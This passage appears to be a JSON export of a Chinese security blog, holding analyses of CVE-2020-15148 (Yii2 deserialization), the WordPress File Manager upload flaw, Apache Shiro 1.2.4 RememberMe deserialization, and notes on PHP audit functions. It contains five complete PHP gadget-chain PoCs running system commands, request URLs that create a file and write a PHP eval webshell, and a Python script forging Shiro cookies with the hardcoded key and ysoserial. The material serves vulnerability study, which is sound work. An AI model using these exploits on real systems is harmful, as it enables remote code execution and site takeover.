进行分割，最后得出来的应该是一直去请求 / 页面，不应返回权限下的页面，这个问题暂且放下，继续向下分析。 然后回到函数 org.springframework.web.servlet.handler.AbstractHandlerMethodMapping#getHandlerInternal 跟进 lookupHandlerMethodorg.springframework.web.servlet.handler.AbstractHandlerMethodMapping#lookupHandlerMethod 跟进其中的 addMatchingMappingsorg.springframework.web.servlet.handler.AbstractHandlerMethodMapping#addMatchingMappings org.springframework.web.servlet.mvc.condition.PatternsRequestCondition#getMatchingCondition org.springframework.web.servlet.mvc.condition.PatternsRequestCondition#getMatchingPatterns 此时我们可以注意到 /admin/{name} 与 /admin/;whippet 能够匹配成功。 会返回/admin/;whippet 的页面，此时的 name 值为 ;wippet ，如果之前我们并没有修改代码，而是固定的页面的话 访问 /admin/page 自然是与 admin/;page 匹配不上的。 参考文章 CVE-2020-13933: Apache Shiro 权限绕过漏洞分析shiro源码篇 - shiro的filter，你值得拥有 document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","categories":[],"tags":[]},{"title":"CVE-2020-15148 Yii框架反序列化","slug":"CVE-2020-15148 Yii框架反序列化","date":"2020-09-21T05:49:01.000Z","updated":"2020-10-12T06:10:55.187Z","comments":true,"path":"2020/09/21/CVE-2020-15148 Yii框架反序列化/","link":"","permalink":"http://yoursite.com/2020/09/21/CVE-2020-15148%20Yii%E6%A1%86%E6%9E%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/","excerpt":"环境搭建 yii下载地址 影响范围 Yii2 &lt; 2.0.38","text":"环境搭建 yii下载地址 影响范围 Yii2 &lt; 2.0.38 选择一个漏洞影响的版本 yii-basic-app-2.0.37.tgz下载后解压到 web 目录下，修改配置文件 config/web.php ，给 cookieValidationKey 字段设置一个值。 然后添加一个存在漏洞的 Action/controllers/TestController.php 1234567891011121314151617&lt;?phpnamespace app\\controllers;use Yii;use yii\\web\\Controller;class TestController extends Controller{ public function actionTest(){ $name = Yii::$app-&gt;request-&gt;get('unserialize'); return unserialize(base64_decode($name)); }}?&gt; 测试运行成功 漏洞分析 利用链 1 查看 github 的 commit 记录 发现在 /db/BatchQueryResult.php 中新增了 __wakeup() 方法，在 __wakeup() 方法中抛出异常。 unserialize() 会检查是否存在一个 __wakeup() 方法。如果存在，则会先调用 __wakeup 方法，预先准备对象需要的资源。 利用 __wakeup() 方法抛出一个异常，本质上是为了防止 BatchQueryResult 类被反序列化。 猜测 BatchQueryResult 类为反序列化的起点 vendor/yiisoft/yii2/db/BatchQueryResult.php::__destruct 1234567891011121314151617public function __destruct(){ // make sure cursor is closed $this-&gt;reset();}public function reset(){ if ($this-&gt;_dataReader !== null) { $this-&gt;_dataReader-&gt;close(); } $this-&gt;_dataReader = null; $this-&gt;_batch = null; $this-&gt;_value = null; $this-&gt;_key = null;} __destruct ( void ) : void析构函数会在到某个对象的所有引用都被删除或者当对象被显式销毁时执行。 __destruct 方法里面调用了 reset 方法， reset 方法里面又调用了 close 方法。\\$this-&gt;_dataReader 的值可控，所以可以当作跳板去执行其他类中的魔术方法 __call() 方法。 public __call ( string $name , array $arguments ) : mixed在对象中调用一个不可访问方法时，__call() 会被调用。$name 参数是要调用的方法名称。$arguments 参数是一个枚举数组，包含着要传递给方法 $name 的参数。 了解 __call() 方法之后，我们就可以进行全局搜索，找到其中不包含 close方法的类，就可以执行该类的__call() 方法。 全局搜索 function __call( vendor/fzaninotto/faker/src/Faker/Generator.php::__call 1234public function __call($method, $attributes) { return $this-&gt;format($method, $attributes); } 跟进 format vendor/fzaninotto/faker/src/Faker/Generator.php::format 1234public function format($formatter, $arguments = array()){ return call_user_func_array($this-&gt;getFormatter($formatter), $arguments);} format 中调用了 call_user_func_array 方法 ，$formatter 与 $agruments 我们都不可控。此时 $formatter = close,$agruments为空。$formatter 传递至 getFormatter()vendor/fzaninotto/faker/src/Faker/Generator.php::getFormatter 1234567891011121314public function getFormatter($formatter){ if (isset($this-&gt;formatters[$formatter])) { return $this-&gt;formatters[$formatter]; } foreach ($this-&gt;providers as $provider) { if (method_exists($provider, $formatter)) { $this-&gt;formatters[$formatter] = array($provider, $formatter); return $this-&gt;formatters[$formatter]; } } throw new \\InvalidArgumentException(sprintf('Unknown formatter \"%s\"', $formatter));} 我们注意到在 getFormatter 方法中，$this-&gt;formatters[$formatter] 是我们可以控制的，getFormatter 方法返回值是可控的。那么 call_user_func_array 这个函数的第一个参数可控，第二个参数为空。此时我们就可以调用 yii 框架中的任何一个无参的方法了。 call_user_func_array ( callable $callback , array $param_arr ) : mixed把第一个参数作为回调函数（callback）调用，把参数数组作（param_arr）为回调函数的参数传入。调用类中的公共方法可以利用 call_user_func_array(['类名','类中的方法'],[]); 全局搜索 call_user_func\\(\\$this-&gt;([a-zA-Z0-9]+), \\$this-&gt;([a-zA-Z0-9]+) 找到使用 call_user_func 函数，且参数为类中成员变量的所有方法。 利用其中的 vendor/yiisoft/yii2/rest/CreateAction.php::run 1234567public function run(){ if ($this-&gt;checkAccess) { call_user_func($this-&gt;checkAccess, $this-&gt;id); } ......} $this-&gt;checkAccess 以及 $this-&gt;id 都可控 所以利用链为： yii\\db\\BatchQueryResult::__destruct()yii\\db\\BatchQueryResult::reset()Faker\\Generator::__call()Faker\\Generator::format(‘close’,[])call_user_func_array([‘new yii\\rest\\CreateAction’,’run’],[])yii\\rest\\CreateAction::run()call_user_func(‘system’,’whoami’) 12345678910$n = yii\\db\\BatchQueryResult{ $this-&gt;_dataReader = Faker\\Generator{ $this-&gt;formatters['close'] = [ yii\\rest\\CreateAction{ $this-&gt;checkAccess = 'system'; $this-&gt;id = 'whoami'; } ,'run']; }} POC 12345678910111213141516171819202122232425262728293031323334353637383940&lt;?phpnamespace yii\\rest{ class CreateAction{ public $checkAccess; public $id; public function __construct(){ $this-&gt;checkAccess = 'system'; $this-&gt;id = 'whoami'; } }}namespace Faker{ use yii\\rest\\CreateAction; class Generator{ protected $formatters; public function __construct(){ $this-&gt;formatters['close'] = [new CreateAction(), 'run']; } }}namespace yii\\db{ use Faker\\Generator; class BatchQueryResult{ private $_dataReader; public function __construct(){ $this-&gt;_dataReader = new Generator; } }}namespace{ echo base64_encode(serialize(new yii\\db\\BatchQueryResult));}?&gt; 利用链2 BatchQueryResult 类仍为反序列化的起点，不利用魔术方法 __call()，选择将 $this-&gt;_dataReader 赋值为一个存在 close 方法的类，找到该类中 close方法调用中存在代码执行。 \\yii2\\web\\DbSession::close 12345678public function close(){ if ($this-&gt;getIsActive()) { // prepare writeCallback fields before session closes $this-&gt;fields = $this-&gt;composeFields(); YII_DEBUG ? session_write_close() : @session_write_close(); }} 当 $this-&gt;getIsActive() 为 true 时，则会调用 $this-&gt;composeFields()跟进 DbSession 的父类 MultiFieldSession 的父类 Session\\yii2\\web\\Session::getIsActive 1234public function getIsActive() { return session_status() === PHP_SESSION_ACTIVE; } 当Yii的debug和gii这两个默认扩展都存在（不一定要开启）时，这里返回true。否则返回false。默认安装情况下都返回true。跟进 composeFields 方法，在DbSession 的父类 MultiFieldSession 中实现\\yii\\web\\MultiFieldSession::composeFields 1234567891011protected function composeFields($id = null, $data = null){ $fields = $this-&gt;writeCallback ? call_user_func($this-&gt;writeCallback, $this) : []; if ($id !== null) { $fields['id'] = $id; } if ($data !== null) { $fields['data'] = $data; } return $fields;} 发现调用了call_user_func函数， $this-&gt;writeCallback 可控，其余参数不可控。可以通过控制 $this-&gt;writeCallback 为 [‘类名’,’类中的方法’] 来实现调用类中的方法。 全局搜索 call_user_func\\(\\$this-&gt;([a-zA-Z0-9]+) 利用其中的 \\yii\\rest\\IndexAction::run 1234567public function run(){ if ($this-&gt;checkAccess) { call_user_func($this-&gt;checkAccess, $this-&gt;id); } ......} $this-&gt;checkAccess 以及 $this-&gt;id 都可控 利用链 yii\\db\\BatchQueryResult::__destruct()yii\\db\\BatchQueryResult::reset()yii\\web\\DbSession::close()yii\\web\\MultiFieldSession::composeFields()call_user_func_array([‘new yii\\rest\\IndexAction’,’run’],[])yii\\rest\\IndexAction::run()call_user_func(‘system’,’whoami’) POC 1234567891011121314151617181920212223242526272829303132333435363738394041&lt;?phpnamespace yii\\rest { class IndexAction { public $checkAccess; public $id; public function __construct() { $this-&gt;checkAccess = 'system'; $this-&gt;id = 'whoami'; } }}namespace yii\\web { use yii\\rest\\IndexAction; class DbSession { public $writeCallback; public function __construct() { $this-&gt;writeCallback = [new IndexAction(), \"run\"]; } }}namespace yii\\db { use yii\\web\\DbSession; class BatchQueryResult { private $_dataReader; public function __construct() { $this-&gt;_dataReader = new DbSession(); } }}namespace{ echo base64_encode(serialize(new yii\\db\\BatchQueryResult));} 利用链3 \\Codeception\\Extension\\RunProcess::__destruct 1234public function __destruct() { $this-&gt;stopProcess(); } \\Codeception\\Extension\\RunProcess::stopProcess 123456789101112public function stopProcess() { foreach (array_reverse($this-&gt;processes) as $process) { /** @var $process Process **/ if (!$process-&gt;isRunning()) { continue; } $this-&gt;output-&gt;debug('[RunProcess] Stopping ' . $process-&gt;getCommandLine()); $process-&gt;stop(); } $this-&gt;processes = []; } 注意到 RunProcess 中的 __destruct 方法调用了 stopProcess() 方法， stopProcess() 方法 中的 $this-&gt;processes 可控，则 $process 可控，下面调用了 $process-&gt;isRunning() ，则又可以利用魔术方法 __call()。 利用链 \\Codeception\\Extension\\RunProcess::__destruct()\\Codeception\\Extension\\RunProcess::stopProcess()Faker\\Generator::__call()Faker\\Generator::format(‘isRunning’,[])call_user_func_array([‘new yii\\rest\\CreateAction’,’run’],[])yii\\rest\\CreateAction::run()call_user_func(‘system’,’whoami’) poc 1234567891011121314151617181920212223242526272829303132333435363738394041&lt;?phpnamespace yii\\rest{ class CreateAction{ public $checkAccess; public $id; public function __construct(){ $this-&gt;checkAccess = 'system'; $this-&gt;id = 'whoami'; } }}namespace Faker{ use yii\\rest\\CreateAction; class Generator{ protected $formatters; public function __construct(){ $this-&gt;formatters['isRunning'] = [new CreateAction(), 'run']; } }}namespace Codeception\\Extension{ use Faker\\Generator; class RunProcess{ private $processes; public function __construct(){ $this-&gt;processes = [new Generator]; } }}namespace{ echo base64_encode(serialize(new Codeception\\Extension\\RunProcess));}?&gt; 利用链4 \\Swift_KeyCache_DiskKeyCache::__destruct 123456public function __destruct(){ foreach ($this-&gt;keys as $nsKey =&gt; $null) { $this-&gt;clearAll($nsKey); }} \\Swift_KeyCache_DiskKeyCache::clearAll 123456789101112public function clearAll($nsKey){ if (array_key_exists($nsKey, $this-&gt;keys)) { foreach ($this-&gt;keys[$nsKey] as $itemKey =&gt; $null) { $this-&gt;clearKey($nsKey, $itemKey); } if (is_dir($this-&gt;path.'/'.$nsKey)) { rmdir($this-&gt;path.'/'.$nsKey); } unset($this-&gt;keys[$nsKey]); }} 因为 $nsKey $this-&gt;keys 可控，跟进$this-&gt;clearKey(· \\Swift_KeyCache_DiskKeyCache::clearKey 1234567public function clearKey($nsKey, $itemKey){ if ($this-&gt;hasKey($nsKey, $itemKey)) { $this-&gt;freeHandle($nsKey, $itemKey); unlink($this-&gt;path.'/'.$nsKey.'/'.$itemKey); }} \\Swift_KeyCache_DiskKeyCache::hasKey 1234public function hasKey($nsKey, $itemKey){ return is_file($this-&gt;path.'/'.$nsKey.'/'.$itemKey);} $this-&gt;path 可控 ，进行了字符串的拼接操作，可以利用魔术方法 __toString 触发后续操作。 __toString() 方法用于一个类被当成字符串时应怎样回应。 然后全局搜索 __toString 方法 \\phpDocumentor\\Reflection\\DocBlock\\Tags\\See::__toString 1234public function __toString() : string{ return $this-&gt;refers . ($this-&gt;description ? ' ' . $this-&gt;description-&gt;render() : '');} $this-&gt;description 可控，则又可以利用魔术方法 __call()。 利用链 \\Swift_KeyCache_DiskKeyCache::__destruct()\\Swift_KeyCache_DiskKeyCache::clearAll()\\Swift_KeyCache_DiskKeyCache::clearKey()\\Swift_KeyCache_DiskKeyCache::hasKey()\\phpDocumentor\\Reflection\\DocBlock\\Tags\\See::__toString()\\Faker\\Generator::__call()\\Faker\\Generator::format(‘render’,[])\\call_user_func_array([‘new yii\\rest\\CreateAction’,’run’],[])\\yii\\rest\\CreateAction::run()\\call_user_func(‘system’,’whoami’) POC 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556&lt;?phpnamespace yii\\rest{ class CreateAction{ public $checkAccess; public $id; public function __construct(){ $this-&gt;checkAccess = 'phpinfo'; $this-&gt;id = '1'; } }}namespace Faker{ use yii\\rest\\CreateAction; class Generator{ protected $formatters; public function __construct(){ $this-&gt;formatters['render'] = [new CreateAction(), 'run']; } }}namespace phpDocumentor\\Reflection\\DocBlock\\Tags{ use Faker\\Generator; class See{ protected $description; public function __construct() { $this-&gt;description = new Generator(); } }}namespace { use phpDocumentor\\Reflection\\DocBlock\\Tags\\See; class Swift_KeyCache_DiskKeyCache { private $keys = []; private $path; public function __construct() { $this-&gt;path = new See; $this-&gt;keys = array( \"test\"=&gt;array(\"test\") ); } }}namespace{ echo base64_encode(serialize(new Swift_KeyCache_DiskKeyCache()));}?&gt; 利用链5 \\Symfony\\Component\\String\\UnicodeString::__wakeup 1234public function __wakeup(){ normalizer_is_normalized($this-&gt;string) ?: $this-&gt;string = normalizer_normalize($this-&gt;string);} __wakeup 方法中 调用了 normalizer_is_normalized 方法 normalizer_is_normalized 方法 会把参数当作字符串进行处理 ，并且$this-&gt;string 可控。只需要寻找魔术方法 __toString 触发后续操作。 normalizer_is_normalized 检查提供的字符串是否已经处于指定的规范化形式 利用链 \\Symfony\\Component\\String\\UnicodeString::__wakeup normalizer_is_normalized()\\phpDocumentor\\Reflection\\DocBlock\\Tags\\See::__toString()\\Faker\\Generator::__call()\\Faker\\Generator::format(‘render’,[])\\call_user_func_array([‘new yii\\rest\\CreateAction’,’run’],[])\\yii\\rest\\CreateAction::run()\\call_user_func(‘system’,’whoami’) POC 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152&lt;?phpnamespace yii\\rest{ class CreateAction{ public $checkAccess; public $id; public function __construct(){ $this-&gt;checkAccess = 'phpinfo'; $this-&gt;id = '1'; } }}namespace Faker{ use yii\\rest\\CreateAction; class Generator{ protected $formatters; public function __construct(){ $this-&gt;formatters['render'] = [new CreateAction(), 'run']; } }}namespace phpDocumentor\\Reflection\\DocBlock\\Tags{ use Faker\\Generator; class See{ protected $description; public function __construct() { $this-&gt;description = new Generator(); } }}namespace Symfony\\Component\\String{ use phpDocumentor\\Reflection\\DocBlock\\Tags\\See; class UnicodeString { private $string; public function __construct() { $this-&gt;string = new See; } }}namespace{ echo base64_encode(serialize(new Symfony\\Component\\String\\UnicodeString()));}?&gt; 在执行 system(\"whoami\") 的命令时，会报错 yii 视图报错导致无法回显命令执行的结果，执行其他命令即可。 可能还会遇到大佬说的这个问题 PREG_UNMATCHED_AS_NULL ，REG_UNMATCHED_AS_NULL 这个静态变量存在于 php7.2 版本以上，更换 php 版本就可以解决这个问题。 我选择 php7.3.4 时利用成功，选择 php7.0.9 虽没利用成功，但没有详细的报错信息。 参考文章 CVE-2020-15148 Yii2反序列化RCE POP链分析我是怎么挖掘yii2反序列化0day的yii2反序列化后续怎样挖掘出属于自己的php反序列化链 document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","categories":[],"tags":[]},{"title":"Wordpress file manager插件命令执行","slug":"Wordpress file manager插件命令执行","date":"2020-09-10T02:50:32.000Z","updated":"2020-10-12T06:10:55.190Z","comments":true,"path":"2020/09/10/Wordpress file manager插件命令执行/","link":"","permalink":"http://yoursite.com/2020/09/10/Wordpress%20file%20manager%E6%8F%92%E4%BB%B6%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/","excerpt":"ps: 首发在云众可信的sec-in平台：sec-in.com 环境搭建 利用 phpstudy 搭建 wordpress ，http://wordpress.test/wp-admin/plugin-install.php 将解压一次后的漏洞插件压缩包上传并启用插件。 File Manager插件6.0版本","text":"ps: 首发在云众可信的sec-in平台：sec-in.com 环境搭建 利用 phpstudy 搭建 wordpress ，http://wordpress.test/wp-admin/plugin-install.php 将解压一次后的漏洞插件压缩包上传并启用插件。 File Manager插件6.0版本 漏洞利用 这段代码来自 elFinder 项目，这是一个向 Web 应用程序提供文件浏览器 GUI 的框架。这个非常具体的代码仅作为示例，而不能在生产应用程序中直接使用。但是，正如我们所看到的，使用了它，结果是可以执行这部分代码而无需进行身份验证。 在 exp-db 搜索 elFinder 下载下来的漏洞利用文件需要修改部分 漏洞分析 发送一个这样的 payload 来进行创建文件的操作 http://wordpress.test/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php?cmd=mkfile&amp;name=test.php&amp;target=l1_Lw 漏洞触发位置 /wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php 通过创建 elFinderConnector 对象，进而调用 elFinderConnector.run 读取所有的请求参数保存到 $src 中， $cmd 获取 cmd 变量。\\elFinderConnector::run 接着执行到循环 foreach ($this-&gt;elFinder-&gt;commandArgsList($cmd) as $name =&gt; $req) { 对 $cmd 进行校验 跟进函数commandArgsList\\elFinder::commandArgsList \\elFinder::commandExists 通过判断 $cmd ，在 $this-&gt;commands[$cmd] 中发现了可以调用的方法\\elFinder::$commands 继续执行，发现 $this-&gt;output($this-&gt;elFinder-&gt;exec($cmd, $args)); \\elFinder::exec 控制 $cmd = makedile 时, 为满足条件继续向下执行，需要传入 $target 或者 $dst。 $this-&gt;volume($dst) 根据传入的 $dst 前缀进行选择 l1_ 或者 t1_ 我们在后面进行调试时会发现生成文件的位置前缀为所对应的 root 的值 ，所以我们在这里选择 l1_\\elFinder::volume 继续执行到动态调用，通过 $result = $this-&gt;$cmd($args); 调用makefile方法。\\elFinderVolumeDriver::mkfile $path = $this-&gt;decode($dst); \\elFinderVolumeDriver::decodedecode 函数 先将$hash 的值根据 $this-&gt;id 进行分割，然后替换字串并进行 base64 解码 然后拼接 所对应的 $this-&gt;root 返回$path = E:\\Tools\\phpstudy_pro\\WWW\\wordpress\\wp-content\\plugins\\wp-file-manager\\lib\\files继续回到 mkfile 函数中执行 \\elFinderVolumeLocalFileSystem::_mkfile 最后顺利生成文件在 E:\\Tools\\phpstudy_pro\\WWW\\wordpress\\wp-content\\plugins\\wp-file-manager\\lib\\files\\test.php对于网站的位置就是 \\wp-content\\plugins\\wp-file-manager\\lib\\files\\test.php 然后再调用 PUT 方法，传值到 mkfile 生成的文件内。 http://wordpress.test/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php?cmd=put&amp;target=l1_dGVzdC5waHA=&amp;content=&lt;?php eval($_GET['cmd']);?&gt; 前一部分不在详述，直接跟到 $result = $this-&gt;$cmd($args); 调用 put 方法 \\elFinder::put \\elFinderVolumeDriver::putContents \\elFinderVolumeDriver::decodedecode 函数 先将$hash 的值根据 $this-&gt;id 进行分割，然后替换字串并进行 base64 解码 然后拼接 所对应的 $this-&gt;root 最后会返回 $path 的值为E:\\Tools\\phpstudy_pro\\WWW\\wordpress\\wp-content\\plugins\\wp-file-manager\\lib\\files\\test.php\\elFinderVolumeLocalFileSystem::_filePutContents 成功将字符串写入文件中 成功利用还可以直接利用 upload 方法，上传文件 \\elFinder::upload 参考文章 Wordpress file manager插件任意文件上传WordPress文件管理器插件0day漏洞解析 document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","categories":[],"tags":[]},{"title":"Apache Shiro 1.2.4反序列化漏洞","slug":"Apache Shiro 1.2.4反序列化漏洞","date":"2020-08-31T06:37:52.000Z","updated":"2020-10-12T06:10:55.186Z","comments":true,"path":"2020/08/31/Apache Shiro 1.2.4反序列化漏洞/","link":"","permalink":"http://yoursite.com/2020/08/31/Apache%20Shiro%201.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/","excerpt":"漏洞简介 Apache Shiro 是一款开源安全框架，提供身份验证、授权、密码学和会话管理。Shiro框架直观、易用，同时也能提供健壮的安全性。Apache Shiro 1.2.4及以前版本中，加密的用户信息序列化后存储在名为 RememberMe 的 Cookie 中。攻击者可以使用 Shiro 的默认密钥伪造用户 Cookie，触发Java反序列化漏洞，进而在目标机器上执行任意命令。","text":"漏洞简介 Apache Shiro 是一款开源安全框架，提供身份验证、授权、密码学和会话管理。Shiro框架直观、易用，同时也能提供健壮的安全性。Apache Shiro 1.2.4及以前版本中，加密的用户信息序列化后存储在名为 RememberMe 的 Cookie 中。攻击者可以使用 Shiro 的默认密钥伪造用户 Cookie，触发Java反序列化漏洞，进而在目标机器上执行任意命令。 SHIRO-550在识别身份的时候，需要对 Cookie 里的 RememberMe 字段解密,解密的顺序为： 检索cookie中RememberMe的值 Base64解码 使用AES解密 反序列化 但是，AES 加密的秘钥被硬编码在代码里，每个人通过源代码都可以拿到 AES 加密的密钥。所以当攻击者将恶意的 payload 进行序列化、AES 加密、base64 编码，作为 Cookie 的 RememberMe 字段发送。Shiro 将 RememberMe 进行解密并且反序列化，最终造成反序列化漏洞。 漏洞分析 获取 Apache Shiro 存在漏洞的源代码 123git clone https://github.com/apache/shiro.git cd shiro git checkout shiro-root-1.2.4 修改 /shiro/samples/web/pom.xml 123456789101112&lt;dependency&gt; &lt;groupId&gt;javax.servlet&lt;/groupId&gt; &lt;artifactId&gt;jstl&lt;/artifactId&gt; &lt;version&gt;1.2&lt;/version&gt; &lt;scope&gt;runtime&lt;/scope&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;taglibs&lt;/groupId&gt; &lt;artifactId&gt;standard&lt;/artifactId&gt; &lt;version&gt;1.1.2&lt;/version&gt; &lt;scope&gt;runtime&lt;/scope&gt;&lt;/dependency&gt; 然后用idea导入mvn项目 设置run/debug configurations， 添加本地tomcat环境 在 org.apache.shiro.mgt.RememberMeManager#onSuccessfulLogin 处添加断点，然后debug 开启 tomcat 服务 加密过程 登录账户root/secret，勾选上Remember Me的按钮，程序会停在断点处，用户名和密码也会存储在 token 中forgetIdentity 针对 subject 变量进行处理，跟进 forgetIdentity 方法org.apache.shiro.web.mgt.CookieRememberMeManager#forgetIdentity(org.apache.shiro.subject.Subject) 调用 forgetIdentity 构造方法处理 request 和 reponse 请求org.apache.shiro.web.mgt.CookieRememberMeManager#forgetIdentity(javax.servlet.http.HttpServletRequest, javax.servlet.http.HttpServletResponse) 跟进 removeFrom 方法，在 response 响应头中加入了一些cookie信息。org.apache.shiro.web.servlet.SimpleCookie#removeFrom 回到 onSuccessfulLogin 调用 rememberIdentity 生成 cookie 中的 remember 字段。跟进 rememberIdentity 方法。org.apache.shiro.mgt.AbstractRememberMeManager#rememberIdentity(org.apache.shiro.subject.Subject, org.apache.shiro.authc.AuthenticationToken, org.apache.shiro.authc.AuthenticationInfo) 通过 getIdentityToRemember 获取用户的身份，继续跟进 rememberIdentity 方法。org.apache.shiro.mgt.AbstractRememberMeManager#rememberIdentity(org.apache.shiro.subject.Subject, org.apache.shiro.subject.PrincipalCollection) 调用 convertPrincipalsToBytes 方法将 accountPrincipals &lt;“root”&gt; 转换为字节形式，跟进 convertPrincipalsToBytes 方法。org.apache.shiro.mgt.AbstractRememberMeManager#convertPrincipalsToBytes 转换过程中首先对用户的 id 进行序列化，然后利用 encrypt 进行加密。org.apache.shiro.mgt.AbstractRememberMeManager#encrypt 加密的密钥由getEncryptionCipherKey()得到 getEncryptionCipherKey 实际上是开头中的 DEFAULT_CIPHER_KEY_BYTES 的常量 kPH+bIxk5D2deZiIxcaaaA== 密钥分析org.apache.shiro.mgt.AbstractRememberMeManager#AbstractRememberMeManager org.apache.shiro.mgt.AbstractRememberMeManager#setCipherKey org.apache.shiro.mgt.AbstractRememberMeManager#setEncryptionCipherKey org.apache.shiro.mgt.AbstractRememberMeManager#getEncryptionCipherKey 继续单步执行，返回 rememberIdentity 函数 跟进函数 rememberSerializedIdentity org.apache.shiro.web.mgt.CookieRememberMeManager#rememberSerializedIdentity对值进行 base64 编码之后，设置到 cookie 中。 当我们勾选 RememberMe 选项框之后，点击登陆之后，后端会进行如下操作。 序列化用户 id 对用户 id 进行 AES 加密，密钥为常量 base64 编码 设置到 cookie 中的 rememberme 字段 解密过程 在 org.apache.shiro.mgt.DefaultSecurityManager#getRememberedIdentity 添加断点，然后发送一个带有 readmemberMe cookie的请求。 跟进函数 getRememberedPrincipalsorg.apache.shiro.mgt.AbstractRememberMeManager#getRememberedPrincipals 调用 getRememberedSerializedIdentity 针对http请求进行处理，跟进 getRememberedSerializedIdentity org.apache.shiro.web.mgt.CookieRememberMeManager#getRememberedSerializedIdentity getCookie 构造方法先获取 cookie 信息,readValue 方法，根据 Cookie 中的 name 字段获取 Cookie 的值，然后返回 Cookie 的值 然后调用 byte[] decoded = Base64.decode(base64)处理 base64 加密的 Cookie 信息，并且将这个 Cookie 转化为二进制字节码 回到 getRememberedPrincipals，继续跟进 convertBytesToPrincipals 函数org.apache.shiro.mgt.AbstractRememberMeManager#convertBytesToPrincipals AES 解密 org.apache.shiro.mgt.AbstractRememberMeManager#decrypt 反序列化 org.apache.shiro.mgt.AbstractRememberMeManager#deserializeorg.apache.shiro.io.DefaultSerializer#deserialize看到 readObject() 当我们发送带有 readmemberMe cookie的请求，后端会进行如下操作。 读取 cookie 中 rememberMe 的值 base64 解码 进行 AES 解密，密钥为常量 反序列化 123456789101112131415161718192021222324252627282930#!/usr/bin/env python3# coding:utf-8from Crypto.Cipher import AESimport tracebackimport requestsimport subprocessimport uuidimport base64target = \"http://localhost:8080/samples_web_war/\"jar_file = 'F:\\\\Penetration\\\\ysoserial\\\\ysoserial-0.0.6-SNAPSHOT-all.jar'cipher_key = \"kPH+bIxk5D2deZiIxcaaaA==\"# 创建 rememberme的值popen = subprocess.Popen(['java','-jar',jar_file, \"URLDNS\", \"http://7zhfmm.dnslog.cn\"], stdout=subprocess.PIPE)BS = AES.block_sizepad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()mode = AES.MODE_CBCiv = uuid.uuid4().bytesencryptor = AES.new(base64.b64decode(cipher_key), mode, iv)file_body = pad(popen.stdout.read())base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))# 发送requesttry: r = requests.get(target, cookies={'rememberMe':base64_ciphertext.decode()}, timeout=10)except: traceback.print_exc() 漏洞利用 commons-collections 3.2.1 shiro自带的commons-collections-3.2.1 、commons-beanutils-1.8.3 在JDK1.8u112中，可以直接利用 ysoserial 中的Commons-Collections5（3.1-3.2.1，jdk1.8） 1java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections5 \"clac\" 会报错提示 org.apache.shiro.io.SerializationException: Unable to deserialze argument byte array. 回到 org.apache.shiro.io.DefaultSerializer#deserialize 我们发现在这里使用了 ClassResolvingObjectInputStream 类而非传统的 ObjectInputStream org.apache.shiro.io.ClassResolvingObjectInputStream#resolveClass java.io.ObjectInputStream#resolveClass ObjectInputStream 的 resolveClass 函数用的是Class.forName 类获取当前描述器所指代的类的Class对象 shiro 中 ClassResolvingObjectInputStream 继承了 ObjectInputStream，resolveClass 被重写，调用了 ClassUtils.forName 获取当前描述器所指代的类的Class对象 org.apache.shiro.util.ClassUtils#forName 看一下 ExceptionIgnoringAccessor 是如何是实现的org.apache.shiro.util.ClassUtils.ExceptionIgnoringAccessor commons-collections 4.0 参考文章 Apache Shiro Java反序列化漏洞分析Shiro 1.2.4 RememberMe反序列化漏洞踩坑分析(CVE-2016-4437)Pwn a CTF Platform with Java JRMP Gadget document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","categories":[],"tags":[]},{"title":"相关函数总结","slug":"相关函数总结","date":"2020-08-20T13:31:50.000Z","updated":"2020-10-12T06:10:55.191Z","comments":true,"path":"2020/08/20/相关函数总结/","link":"","permalink":"http://yoursite.com/2020/08/20/%E7%9B%B8%E5%85%B3%E5%87%BD%E6%95%B0%E6%80%BB%E7%BB%93/","excerpt":"PHP 相关函数","text":"PHP 相关函数 审计利用函数 var_dump() var_dump() 函数用于输出变量的相关信息。 任意文件下载 fread() fread() 函数读取文件（可安全用于二进制文件）fread(file,length) 参数 描述 file 必需。规定要读取打开文件。 length 必需。规定要读取的最大字节数。 123456789101112131415$path = \"../{$file}\";$handle = fopen($path, \"r\");header(\"Pragma: \");header(\"Cache-Control: \");header(\"Content-type: application/octet-stream; charset=utf-8\");header(\"Content-Disposition: attachment; filename=\\\"{$name}\\\"\");if ($handle) { while (!feof($handle)) { $read = fread($handle, 4096); print($read); }}pclose($handle); 变量覆盖 extrat() extract() 从数组中将变量导入到当前的符号表 命令执行 call_user_func_array() call_user_func_array(“system”,[“whoami”]); document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); 